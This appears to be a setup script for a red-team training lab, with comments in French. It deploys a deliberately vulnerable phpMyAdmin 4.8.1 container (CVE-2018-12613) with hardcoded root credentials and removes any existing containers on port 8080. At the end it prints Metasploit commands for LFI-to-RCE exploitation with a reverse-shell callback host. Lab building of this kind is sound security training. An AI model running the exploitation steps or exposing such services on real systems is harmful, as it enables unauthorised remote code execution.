#!/bin/bash

###############################################################################
# Iron4Software Red Team Lab - phpMyAdmin 4.8.1 Docker
# CVE-2018-12613 - Local File Inclusion ‚Üí Remote Code Execution
# Nettoyage automatique du port 8080
###############################################################################

set -e

echo "========================================================"
echo "  Iron4Software Lab - phpMyAdmin 4.8.1 Docker"
echo "  CVE-2018-12613 (LFI ‚Üí RCE)"
echo "========================================================"
echo ""

PORT=8080

if [ "$EUID" -ne 0 ]; then 
    echo "‚ùå Ce script doit √™tre ex√©cut√© en tant que root"
    exit 1
fi

echo "[1/7] V√©rification de Docker..."
if ! command -v docker &> /dev/null; then
    echo "üì¶ Installation de Docker..."
    curl -fsSL https://get.docker.com -o get-docker.sh
    sh get-docker.sh
    systemctl enable docker
    systemctl start docker
    rm get-docker.sh
fi

docker --version
echo "‚úÖ Docker install√©"

echo ""
echo "[2/7] Nettoyage du port ${PORT}..."

# Trouver tous les containers utilisant le port 8080
CONTAINERS_ON_PORT=$(docker ps -a --format '{{.Names}}' --filter "publish=${PORT}" 2>/dev/null)

if [ -n "$CONTAINERS_ON_PORT" ]; then
    echo "‚ö†Ô∏è  Containers trouv√©s sur le port ${PORT} :"
    echo "$CONTAINERS_ON_PORT"
    echo ""
    
    for CONTAINER in $CONTAINERS_ON_PORT; do
        echo "   üóëÔ∏è  Suppression de : $CONTAINER"
        docker stop "$CONTAINER" 2>/dev/null || true
        docker rm "$CONTAINER" 2>/dev/null || true
    done
    
    echo "‚úÖ Port ${PORT} lib√©r√©"
else
    echo "‚úÖ Port ${PORT} d√©j√† libre"
fi

echo ""
echo "[3/7] Suppression de l'ancien phpmyadmin-vuln (si existant)..."
docker stop phpmyadmin-vuln 2>/dev/null || true
docker rm phpmyadmin-vuln 2>/dev/null || true

echo "[4/7] T√©l√©chargement de l'image phpMyAdmin 4.8.1..."
docker pull phpmyadmin/phpmyadmin:4.8.1

echo ""
echo "[5/7] Lancement du container phpMyAdmin 4.8.1..."
docker run -d \
    --name phpmyadmin-vuln \
    --restart unless-stopped \
    --add-host=host.docker.internal:host-gateway \
    -e PMA_HOST="host.docker.internal" \
    -e PMA_PORT=3306 \
    -e PMA_USER=root \
    -e PMA_PASSWORD=rootpass \
    -p ${PORT}:80 \
    phpmyadmin/phpmyadmin:4.8.1

if [ $? -eq 0 ]; then
    echo "‚úÖ phpMyAdmin 4.8.1 lanc√©"
else
    echo "‚ùå Erreur lors du lancement"
    exit 1
fi

echo ""
echo "[6/7] Attente du d√©marrage (15 secondes)..."
sleep 15

echo "[7/7] V√©rification..."
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:${PORT}/ 2>/dev/null)
SERVER_IP=$(hostname -I | awk '{print $1}')

echo ""
echo "========================================================"
echo "  ‚úÖ Installation termin√©e avec succ√®s !"
echo "========================================================"
echo ""
echo "üìä Configuration :"
echo "   Container      : phpmyadmin-vuln"
echo "   Version        : phpMyAdmin 4.8.1 (VULNERABLE)"
echo "   CVE            : CVE-2018-12613"
echo "   Port           : $PORT"
echo "   IP Serveur     : $SERVER_IP"
echo ""
echo "üåê URLs d'acc√®s :"
echo "   Local          : http://localhost:${PORT}/"
echo "   R√©seau         : http://${SERVER_IP}:${PORT}/"
echo ""
echo "üîê Credentials MySQL :"
echo "   User: root"
echo "   Pass: rootpass"
echo ""

if [ "$HTTP_CODE" = "200" ]; then
    echo "‚úÖ phpMyAdmin accessible (HTTP 200)"
else
    echo "‚ö†Ô∏è  phpMyAdmin ne r√©pond pas encore (HTTP $HTTP_CODE)"
    echo "   Attendez 30 secondes et testez: curl http://localhost:${PORT}/"
fi

echo ""
echo "üê≥ Containers Docker actifs :"
docker ps --format "table {{.Names}}\t{{.Image}}\t{{.Ports}}\t{{.Status}}"

echo ""
echo "========================================================"
echo "  üî• EXPLOITATION AVEC METASPLOIT"
echo "========================================================"
echo ""
echo "Depuis Kali Linux :"
echo ""
echo "msfconsole -q"
echo "use exploit/multi/http/phpmyadmin_lfi_rce"
echo "set RHOSTS ${SERVER_IP}"
echo "set RPORT ${PORT}"
echo "set USERNAME root"
echo "set PASSWORD rootpass"
echo "set LHOST 192.168.100.10"
echo "set LPORT 4444"
echo "check"
echo "exploit"
echo ""
echo "========================================================"
echo "  üìö Ressources"
echo "========================================================"
echo ""
echo "CVE-2018-12613 : https://nvd.nist.gov/vuln/detail/CVE-2018-12613"
echo "Exploit-DB     : https://www.exploit-db.com/exploits/44928"
echo "MITRE ATT&CK   : T1190 (Exploit Public-Facing Application)"
echo ""
echo "‚úÖ phpMyAdmin 4.8.1 vuln√©rable - Pr√™t pour exploitation !"
echo ""
